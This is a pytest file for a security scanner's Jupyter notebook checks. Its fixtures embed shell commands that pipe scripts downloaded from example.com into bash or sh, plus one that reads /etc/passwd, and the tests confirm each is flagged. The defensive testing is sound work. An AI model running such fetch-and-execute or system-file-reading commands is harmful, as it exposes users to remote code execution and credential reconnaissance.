import json

from sentinel.cli_dispatch import dispatch_notebook
from sentinel.notebook_scanner import NotebookScanner


def test_notebook_shell_escape_is_flagged(tmp_path):
    notebook_path = tmp_path / "shell.ipynb"
    notebook_path.write_text(
        json.dumps({
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "metadata": {},
                    "outputs": [],
                    "source": ["!curl http://example.com/install.sh | bash\n"],
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }),
        encoding="utf-8",
    )

    result = NotebookScanner().scan_file(str(notebook_path))

    assert any(f.rule_id == "NOTEBOOK-003" for f in result.findings)


def test_notebook_cell_magic_network_to_shell_is_high(tmp_path):
    notebook_path = tmp_path / "cell_magic.ipynb"
    notebook_path.write_text(
        json.dumps({
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "metadata": {},
                    "outputs": [],
                    "source": [
                        "%%bash\n",
                        "curl -fsSL http://example.com/install.sh | sh\n",
                    ],
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }),
        encoding="utf-8",
    )

    result = NotebookScanner().scan_file(str(notebook_path))

    shell_findings = [f for f in result.findings if f.rule_id == "NOTEBOOK-003"]
    assert shell_findings
    assert any(f.severity.value == "high" for f in shell_findings)


def test_notebook_line_magic_sensitive_command_is_flagged(tmp_path):
    notebook_path = tmp_path / "line_magic.ipynb"
    notebook_path.write_text(
        json.dumps({
            "cells": [
                {
                    "cell_type": "code",
                    "execution_count": 1,
                    "metadata": {},
                    "outputs": [],
                    "source": ["%sh cat /etc/passwd\n"],
                }
            ],
            "metadata": {},
            "nbformat": 4,
            "nbformat_minor": 5,
        }),
        encoding="utf-8",
    )

    result = NotebookScanner().scan_file(str(notebook_path))

    assert any(f.rule_id == "NOTEBOOK-003" for f in result.findings)


def test_malformed_notebook_returns_parse_finding(tmp_path):
    notebook_path = tmp_path / "broken.ipynb"
    notebook_path.write_text('{"cells": [', encoding="utf-8")

    findings = dispatch_notebook(str(notebook_path))

    assert any(f.rule_id == "NOTEBOOK-000" for f in findings)
